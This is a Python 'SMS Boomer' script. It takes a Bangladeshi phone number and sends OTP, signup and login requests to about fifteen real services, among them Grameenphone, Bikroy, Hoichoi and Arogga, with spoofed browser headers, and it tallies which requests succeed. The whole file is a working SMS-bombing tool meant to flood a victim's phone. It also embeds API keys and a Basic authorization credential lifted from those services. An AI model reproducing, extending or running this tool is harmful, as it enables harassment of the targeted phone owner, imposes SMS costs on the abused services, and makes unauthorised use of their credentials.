import requests
import time
import subprocess
import shutil
import inspect
import sys
from colorama import Fore, Style, init

init(autoreset=True)

sms_banner_lines = [
    "  ______      ____    ____     ______   ",
    ".' ____ \\    |_   \\  /   _|  .' ____ \\  ",
    "| (___ \\_|     |   \\/   |    | (___ \\_| ",
    " _.____`.      | |\\  /| |     _.____`.  ",
    "| \\____) | _  _| |_\\/|_| |_  | \\____) | ",
    " \\______.''(_)|_____||_____|  \\______.' "
]

def clear_screen():
    subprocess.call("cls" if subprocess.os.name == "nt" else "clear", shell=True)

def animate_banner():
    clear_screen()
    term_width = shutil.get_terminal_size(fallback=(80, 20)).columns
    for _ in range(5):
        print()
    for line in sms_banner_lines:
        print(Fore.CYAN + Style.BRIGHT + line.center(term_width))
        time.sleep(0.15)
    print("\n")

# ===================== API FUNCTIONS =====================
def call_acs_api(phone_number):
    url = "https://auth.acsfutureschool.com/api/v1/otp/send"

    headers = {
        "authority": "auth.acsfutureschool.com",
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://www.acsfutureschool.com",
        "referer": "https://www.acsfutureschool.com/",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
    }

    payload = {
        "phone": phone_number
    }

    try:
        response = requests.post(url, headers=headers, json=payload)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False

def call_bikroy_api(phone_number):
    url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={phone_number}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "Referer": "https://bikroy.com/",
        "Accept": "application/json, text/plain, */*",
    }
    try:
        response = requests.get(url, headers=headers)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False

def call_call_api(mobile_number):
    url = f"https://call-api-vhtx.onrender.com/sms/api/v1?num={mobile_number}"
    try:
        return requests.get(url).status_code == 200
    except:
        return False

def call_hoichoi_api(mobile_number):
    phone = "+88" + mobile_number
    url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv&deviceId=browser-0f9d0956-1f49-248f-f16e-1ea7d99b1da8"
    headers = {
        "accept": "application/json",
        "content-type": "application/json",
        "origin": "https://www.hoichoi.tv",
        "referer": "https://www.hoichoi.tv/",
        "user-agent": "Mozilla/5.0",
        "x-api-key": "PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef"
    }
    payload = {
        "phoneNumber": phone,
        "requestType": "send",
        "whatsappConsent": True
    }
    try:
        response = requests.post(url, headers=headers, json=payload)
        return response.status_code == 200
    except:
        return False

def call_apex_api(phone_number):
    url = 'https://api.apex4u.com/api/auth/login'
    headers = {
        'authority': 'api.apex4u.com',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://apex4u.com',
        'referer': 'https://apex4u.com/',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    }
    payload = {
        'phoneNumber': phone_number
    }
    try:
        response = requests.post(url, headers=headers, json=payload)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Error during API call: {e}")
        return None

def call_gpfi_api(phone_number):
    url = 'https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp'
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Authorization': 'Basic bmVtb2JsdWU6QXBpVXNlckBHUEZp',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json',
        'Origin': 'https://gpfi.grameenphone.com',
        'Referer': 'https://gpfi.grameenphone.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    payload = {
        'phone': phone_number,
        'email': '',
        'language': 'en'
    }
    try:
        response = requests.post(url, headers=headers, json=payload)
        response.raise_for_status()
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Error during GPFI API call: {e}")
        return None

def call_ghoori_api(phone_number):
    url = "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web"
    headers = {
        "authority": "api.ghoorilearning.com",
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://ghoorilearning.com",
        "referer": "https://ghoorilearning.com/",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
    }
    payload = {
        "mobile_no": phone_number
    }

    try:
        response = requests.post(url, headers=headers, json=payload)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False

def call_easy_api(phone_number):
    url = "https://core.easy.com.bd/api/v1/registration"
    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Content-Type": "application/json",
        "Origin": "https://easy.com.bd",
        "Referer": "https://easy.com.bd/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "device-key": "f3aa5acaf17de64db7d82a00c73178af",
        "lang": "en",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"'
    }
    payload = {
        "social_login_id": "",
        "name": "Rrrr",
        "email": "google@gmail.com",
        "mobile": phone_number,
        "password": "12345678",
        "password_confirmation": "12345678",
        "device_key": "f3aa5acaf17de64db7d82a00c73178af"
    }

    try:
        response = requests.post(url, headers=headers, json=payload)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False

def call_sundarban_api(phone_number):
    url = "https://api-gateway.sundarbancourierltd.com/graphql"
    headers = {
        "authority": "api-gateway.sundarbancourierltd.com",
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9",
        "authorization": "",  # Left blank as in curl
        "content-type": "application/json",
        "origin": "https://customer.sundarbancourierltd.com",
        "referer": "https://customer.sundarbancourierltd.com/",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
    }

    payload = {
        "operationName": "CreateAccessToken",
        "variables": {
            "accessTokenFilter": {
                "userName": phone_number
            }
        },
        "query": """mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) {
  createAccessToken(accessTokenFilter: $accessTokenFilter) {
    message
    statusCode
    result {
      phone
      otpCounter
      __typename
    }
    __typename
  }
}"""
    }

    try:
        response = requests.post(url, headers=headers, json=payload)
        return response.status_code == 200
    except requests.exceptions.RequestException:
        return False

def call_quizgiri_api(phone_number):
    import requests

    url = "https://developer.quizgiri.xyz/api/v2.0/send-otp"
    headers = {
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Content-type": "application/json; charset=utf-8",
        "Origin": "https://app.quizgiri.com.bd",
        "Referer": "https://app.quizgiri.com.bd/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "cross-site",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "x-api-key": "gYsiNSVBDuCt8yMUXpF06iQ1eDrMGv6G"
    }

    payload = {
        "phone": phone_number,
        "country_code": "+88",
        "fcm_token": None
    }

    try:
        response = requests.post(url, headers=headers, json=payload)
        return response.status_code == 200
    except requests.exceptions.RequestException as e:
        return False

def call_romoni_api(phone_number):
    import requests

    url = f"https://romoni.com.bd/api/send-otp?phone={phone_number}"
    headers = {
        "authority": "romoni.com.bd",
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "referer": "https://romoni.com.bd/signup",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        # Cookie not required unless you want to simulate a logged-in session
    }

    try:
        response = requests.get(url, headers=headers)  
        return response.status_code == 200
    except requests.exceptions.RequestException as e:
        return False
def call_bdtickets_api(phone_number):
    import requests

    url = "https://api.bdtickets.com:20100/v1/auth"
    headers = {
        "authority": "api.bdtickets.com:20100",
        "accept": "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://bdtickets.com",
        "referer": "https://bdtickets.com/",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
    }

    payload = {
        "createUserCheck": True,
        "phoneNumber": f"+88{phone_number.lstrip('+')}",
        "applicationChannel": "WEB_APP"
    }

    try:
        response = requests.post(url, headers=headers, json=payload) 
        return response.status_code == 200
    except requests.exceptions.RequestException as e:
        return False

def call_gpfi_api(phone_number=None):
    if phone_number is None:
        phone_number = input("Enter phone number for GPFI API: ").strip()

    url = "https://webloginda.grameenphone.com/backend/api/v1/otp"

    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "https://www.grameenphone.com",
        "Referer": "https://www.grameenphone.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua": '"Chromium";v="137", "Not/A)Brand";v="24"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
    }

    payload = {
        "msisdn": phone_number
    }

    try:
        response = requests.post(url, headers=headers, data=payload)
        return response.status_code == 200
    except:
        return False

def call_arogga_api(phone_number):
    url = "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=&v=&os=&osv=&refPartner="

    headers = {
        "accept": "*/*",
        "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
        "origin": "https://m.arogga.com",
        "referer": "https://m.arogga.com/",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36"
    }

    data = {
        "mobile": f"+88{phone_number}",
        "fcmToken": "",
        "referral": ""
    }

    try:
        res = requests.post(url, headers=headers, data=data, timeout=10)
        return res.status_code == 200
    except requests.exceptions.RequestException:
        return False
# ===================== API HANDLER =====================
def handle_apis(mobile_number):
    current_module = sys.modules[__name__]
    api_functions = [
        (name, func) for name, func in inspect.getmembers(current_module, inspect.isfunction)
        if name.startswith("call_") and name.endswith("_api")
    ]

    success_apis = []
    failed_apis = []

    for name, api_func in api_functions:
        try:
            if api_func(mobile_number):
                success_apis.append(name)
            else:
                failed_apis.append(name)
        except Exception:
            failed_apis.append(name)

    return success_apis, failed_apis

# ===================== MAIN =====================
def main():
    animate_banner()  # Ensure banner is shown first
    print(Fore.CYAN + Style.BRIGHT + "\nWelcome to the SMS 💥Boomer💥 Tool!\n")
    mobile_number = input(Fore.RED + Style.BRIGHT + "Enter the mobile number (Ex. 01734567890): ").strip()

    if not (mobile_number.startswith("01") and len(mobile_number) == 11):
        print(Fore.RED + "Invalid number. Must start with 01 and be 11 digits.")
        return

    print(Fore.MAGENTA + "\nSending SMS...\n".center(shutil.get_terminal_size().columns))
    success, failed = handle_apis(mobile_number)

    print(Fore.CYAN + "\nSummary:\n".center(shutil.get_terminal_size().columns))
    print(Fore.GREEN + f"✔ Total Successful: {len(success)}".center(shutil.get_terminal_size().columns))
    if success:
        for api in success:
            print(Fore.GREEN + f"  → {api}")

    print(Fore.RED + f"\n✘ Total Failed: {len(failed)}".center(shutil.get_terminal_size().columns))
    if failed:
        for api in failed:
            print(Fore.RED + f"  → {api}")

if __name__ == "__main__":
    main()